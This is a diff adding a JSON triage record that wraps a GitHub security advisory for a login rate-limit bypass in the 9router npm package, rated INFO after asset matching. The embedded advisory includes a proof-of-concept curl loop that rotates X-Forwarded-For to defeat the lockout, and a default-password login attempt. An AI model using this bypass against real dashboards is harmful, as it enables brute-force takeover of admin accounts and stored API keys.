@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/149681061?v=4\", \"events_url\": \"https://api.github.com/users/dinhvaren/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/dinhvaren/followers\", \"following_url\": \"https://api.github.com/users/dinhvaren/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/dinhvaren/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/dinhvaren\", \"id\": 149681061, \"login\": \"dinhvaren\", \"node_id\": \"U_kgDOCOvzpQ\", \"organizations_url\": \"https://api.github.com/users/dinhvaren/orgs\", \"received_events_url\": \"https://api.github.com/users/dinhvaren/received_events\", \"repos_url\": \"https://api.github.com/users/dinhvaren/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/dinhvaren/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/dinhvaren/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/dinhvaren\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55501\", \"cvss\": {\"score\": 7.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-290\", \"name\": \"Authentication Bypass by Spoofing\"}, {\"cwe_id\": \"CWE-307\", \"name\": \"Improper Restriction of Excessive Authentication Attempts\"}], \"description\": \"## Summary\\n\\nThe 9router dashboard login rate limiter derives the client identity from the attacker-controlled `X-Forwarded-For` HTTP header. When 9router is directly exposed, or deployed behind a reverse proxy that does not overwrite untrusted forwarding headers, a remote attacker can rotate the `X-Forwarded-For` value on each login attempt and receive a fresh rate-limit bucket every time.\\n\\nThis bypasses the dashboard brute-force protection and makes the login lockout mechanism ineffective.\\n\\n## Details\\n\\n| Component                    | File                              | Note                                                                        |\\n| ---------------------------- | --------------------------------- | --------------------------------------------------------------------------- |\\n| Dashboard login rate limiter | `src/lib/auth/loginLimiter.js`    | Uses `X-Forwarded-For` as the client identity without a trusted-proxy check |\\n| Dashboard login route        | `src/app/api/auth/login/route.js` | Calls `checkLock()` and `recordFail()` using the spoofable client identity  |\\n\\n#### Vulnerable Code\\n\\n`src/lib/auth/loginLimiter.js`:\\n\\n```js\\nexport function getClientIp(request) {\\n  const xff = request.headers.get(\\\"x-forwarded-for\\\");\\n  if (xff) return xff.split(\\\",\\\")[0].trim();\\n  return request.headers.get(\\\"x-real-ip\\\") || \\\"unknown\\\";\\n}\\n```\\n\\nThe returned value is used as the key for the in-memory rate-limit state:\\n\\n```js\\nconst attempts = new Map(); // ip -> { fails, lockUntil, lockLevel, lastFailAt }\\n```\\n\\nThe login route uses this value when checking and recording failed login attempts:\\n\\n```js\\nexport async function POST(request) {\\n  const ip = getClientIp(request);\\n  const lock = checkLock(ip);\\n\\n  if (lock.locked) {\\n    return NextResponse.json(\\n      { error: `Too many failed attempts. Try again in ${lock.retryAfter}s.` },\\n      { status: 429 }\\n    );\\n  }\\n\\n  // ... password validation ...\\n\\n  recordFail(ip);\\n}\\n```\\n\\nBecause `X-Forwarded-For` is accepted directly from the request, each unique header value creates a new rate-limit bucket with zero previous failures. An attacker can therefore bypass both the 5-attempt threshold and the progressive lockout durations.\\n\\n## PoC\\n\\n### Step 1 — Baseline: rate limiter triggers when the client identity is stable\\n\\nSend repeated failed login attempts with the same `X-Forwarded-For` value:\\n\\n```http\\nPOST /api/auth/login HTTP/1.1\\nHost: localhost:20128\\nContent-Type: application/json\\nX-Forwarded-For: 1.1.1.1\\n\\n{\\\"password\\\":\\\"wrong-password\\\"}\\n```\\n\\nObserved behavior:\\n\\n| Attempt | Response                                              |\\n| ------- | ----------------------------------------------------- |\\n| 1       | `Invalid password. 4 attempt(s) left before lockout.` |\\n| 2       | `Invalid password. 3 attempt(s) left before lockout.` |\\n| 3       | `Invalid password. 2 attempt(s) left before lockout.` |\\n| 4       | `Invalid password. 1 attempt(s) left before lockout.` |\\n| 5       | `Too many failed attempts. Try again in 30s.`         |\\n| 6       | `Too many failed attempts. Try again in 30s.`         |\\n\\nThis confirms that the lockout logic works when all attempts are assigned to the same rate-limit bucket.\\n\\n### Step 2 — Bypass: rotate `X-Forwarded-For` on each request\\n\\nSend failed login attempts while changing the `X-Forwarded-For` value for every request:\\n\\n```bash\\nfor i in $(seq 1 10); do\\n  curl -s -X POST \\\"http://localhost:20128/api/auth/login\\\" \\\\\\n    -H \\\"Content-Type: application/json\\\" \\\\\\n    -H \\\"X-Forwarded-For: 10.0.0.$i\\\" \\\\\\n    -d '{\\\"password\\\":\\\"wrong-password\\\"}'\\n  echo\\ndone\\n```\\n\\nObserved response for every request:\\n\\n```json\\n{\\n  \\\"error\\\": \\\"Invalid password. 4 attempt(s) left before lockout.\\\",\\n  \\\"remainingBeforeLock\\\": 4\\n}\\n```\\n\\nThe counter resets to the initial state on every request, and the lockout is never triggered.\\n\\n### Step 3 — Impact amplifier: default dashboard password\\n\\nIf the instance is still using the default dashboard password, the rate-limit bypass allows an attacker to avoid lockout while attempting to authenticate.\\n\\nExample request:\\n\\n```http\\nPOST /api/auth/login HTTP/1.1\\nHost: localhost:20128\\nContent-Type: application/json\\nX-Forwarded-For: 99.99.99.99\\n\\n{\\\"password\\\":\\\"<default-dashboard-password>\\\"}\\n```\\n\\nObserved response on a default installation:\\n\\n```http\\nHTTP/1.1 200 OK\\nSet-Cookie: auth_token=<redacted>; Path=/; HttpOnly; SameSite=lax\\n```\\n\\n```json\\n{\\n  \\\"success\\\": true\\n}\\n```\\n\\nThe default password is an impact amplifier, not the root cause. Even if an administrator changes the password, the rate limiter remains structurally bypassable because the attacker controls the rate-limit key.\\n\\n## Attack Scenario\\n\\n1. A remote attacker identifies a publicly reachable 9router dashboard.\\n2. The attacker sends repeated login attempts to `/api/auth/login`.\\n3. For each attempt, the attacker changes the `X-Forwarded-For` header value.\\n4. 9router treats each request as a different client and assigns a fresh rate-limit bucket.\\n5. The attacker can continue brute-force attempts without triggering the configured lockout.\\n6. If the instance uses a weak or default dashboard password, the attacker can gain administrative access.\\n\\n## Impact\\n\\nA successful attacker can bypass the dashboard login lockout mechanism and perform unlimited brute-force attempts against the 9router dashboard password.\\n\\nIf authentication succeeds, the attacker can gain administrative access to the 9router dashboard and may be able to:\\n\\n* Access configured provider credentials and API keys.\\n* Change dashboard and authentication settings.\\n* Disable login protection if the application allows it.\\n* Create persistent API keys or other long-lived access tokens.\\n* Modify application configuration.\\n* Chain the access with other server-side functionality exposed by the dashboard.\", \"epss\": {\"percentage\": 0.00515, \"percentile\": 0.40235}, \"ghsa_id\": \"GHSA-7cfm-pqrj-xgq7\", \"github_reviewed_at\": \"2026-07-06T21:46:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-7cfm-pqrj-xgq7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7cfm-pqrj-xgq7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55501\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-06T21:46:20Z\", \"references\": [\"https://github.com/decolua/9router/security/advisories/GHSA-7cfm-pqrj-xgq7\", \"https://github.com/advisories/GHSA-7cfm-pqrj-xgq7\"], \"repository_advisory_url\": \"https://api.github.com/repos/decolua/9router/security-advisories/GHSA-7cfm-pqrj-xgq7\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/decolua/9router\", \"summary\": \"9router: Login brute-force protection bypass via spoofed X-Forwarded-For header\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-06T21:46:20Z\", \"url\": \"https://api.github.com/advisories/GHSA-7cfm-pqrj-xgq7\", \"vulnerabilities\": [{\"first_patched_version\": \"0.4.77\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"9router\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.4.71\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7cfm-pqrj-xgq7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "9router: <= 0.4.71"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-55501"
+    ],
+    "cvss_score": 7.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "9router"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.825596Z",
+  "provenance": {
+    "content_sha256": "1d0e09defd6d2913b15dc2a682663d4f224906d6c1c0ba614fcf1b98afbede61",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-06T21:46:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7cfm-pqrj-xgq7",
+  "status": "active",
+  "title": "9router: Login brute-force protection bypass via spoofed X-Forwarded-For header",
+  "updated_at": "2026-07-06T21:46:20Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7cfm-pqrj-xgq7"
+}
